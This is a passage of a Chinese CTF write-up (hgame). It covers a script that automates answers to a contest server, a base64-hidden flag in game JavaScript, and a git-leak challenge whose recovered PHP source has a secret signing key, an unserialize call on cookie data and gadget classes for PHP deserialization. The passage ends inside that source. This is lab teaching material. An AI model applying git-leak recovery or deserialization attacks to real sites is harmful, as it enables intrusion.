template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寻找网页规律，发现cookie是没过一关就会更新，自己写了一个来拿flag脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>Cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'eyJzb2x2aW5nIjoyfQ.YBbSaQ.ju02TXjL-IyCNrnBDQE_4pLZsQA'</span><span class="token punctuation">&#125;</span> <span class="token comment"># 这里是第一次的cookie</span><span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token keyword">def</span> <span class="token function">math</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> low<span class="token punctuation">,</span> up<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> integrate<span class="token punctuation">(</span>fun<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> low<span class="token punctuation">,</span> up<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_html</span><span class="token punctuation">(</span>Cookie<span class="token operator">=</span>Cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000/api/getQuestion"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>Cookie<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>    <span class="token comment"># print(r.text)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">def</span> <span class="token function">find_head</span><span class="token punctuation">(</span>soup<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>    msubsup <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'msubsup'</span><span class="token punctuation">)</span>    mrows <span class="token operator">=</span> msubsup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"mrow"</span><span class="token punctuation">)</span>    <span class="token comment"># print(mrows)</span>    mo <span class="token operator">=</span> mrows<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"mo"</span><span class="token punctuation">)</span>    mn <span class="token operator">=</span> mrows<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"mn"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mo<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mn<span class="token punctuation">.</span>string<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mn<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_ab</span><span class="token punctuation">(</span>soup<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>    mrows <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"mrow"</span><span class="token punctuation">)</span>    <span class="token comment"># print(mrows[0])</span>    mns <span class="token operator">=</span> mrows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"mn"</span><span class="token punctuation">)</span>    <span class="token comment"># print(mns[num].string)</span>    mn <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>mns<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">.</span>string<span class="token punctuation">)</span>    <span class="token keyword">return</span> mn<span class="token keyword">def</span> <span class="token function">submit_answer</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> Cookie<span class="token operator">=</span>Cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>    submit_url <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000/api/verify"</span>    json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ra <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>submit_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>Cookie<span class="token punctuation">,</span> json<span class="token operator">=</span>json<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ra<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        ra<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>        ra<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span>        ls <span class="token operator">=</span> ra<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span>        value <span class="token operator">=</span> ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>        Cookie<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>Cookie<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"访问错误"</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>Cookie<span class="token operator">=</span>Cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000/api/getFlag"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>Cookie<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>    <span class="token comment"># print(r.text)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        html <span class="token operator">=</span> get_html<span class="token punctuation">(</span><span class="token punctuation">)</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        low <span class="token operator">=</span> find_head<span class="token punctuation">(</span>soup<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        up <span class="token operator">=</span> find_head<span class="token punctuation">(</span>soup<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># print(low,up)</span>        b <span class="token operator">=</span> find_ab<span class="token punctuation">(</span>soup<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        a <span class="token operator">=</span> find_ab<span class="token punctuation">(</span>soup<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>math<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> low<span class="token punctuation">,</span> up<span class="token punctuation">)</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token string">'&#123;:.2f&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>        submit_answer<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hgame{3very0ne_H4tes_Math}</p><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>考点：代码审计</p><p>合成大西瓜，nonono，我可不擅长这个游戏，看看网站结构：</p><p>关键应该就在于这个project.js的文件，进入查看源码，搜索alert，一般都是过关弹出flag，成功定位到了window.atob()，这是一个用来解base64的方法，那么就base64解一下里面的内容就可以得到flag</p><p>hgame{do_you_know_cocos_game?}</p><h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>考点：git泄露、PHP反序列化</p><p>首先根据提示使用githack抓取git目录，对git泄露的源码进行代码审计。</p><p>simulator.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Simulator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$session</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cardsPool</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">session</span><span class="token operator">-></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cardsPool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CardsPool</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./pool.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cardsPool</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$count</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cardsPool</span><span class="token operator">-></span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"stars"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$card</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"No"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$card</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">session</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getLegendary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$six</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">session</span><span class="token operator">-></span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$six</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cardsPool</span><span class="token operator">-></span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$six</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">CardsPool</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cards</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cards pool file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">42</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">43</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">91</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$rand_key</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"stars"</span> <span class="token operator">=></span> <span class="token variable">$level</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"No"</span> <span class="token operator">=></span> <span class="token variable">$rand_key</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"card"</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$rand_key</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$sessionData</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">SECRET_KEY</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$serialized</span> <span class="token operator">.</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">.</span> <span class="token variable">$sign</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$session</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sess_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$sess_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$sess_array</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$sign</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">.</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Go away! You hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Eeeeeeevallllllll</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string double-quoted-string">"坏坏liki到此一游"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></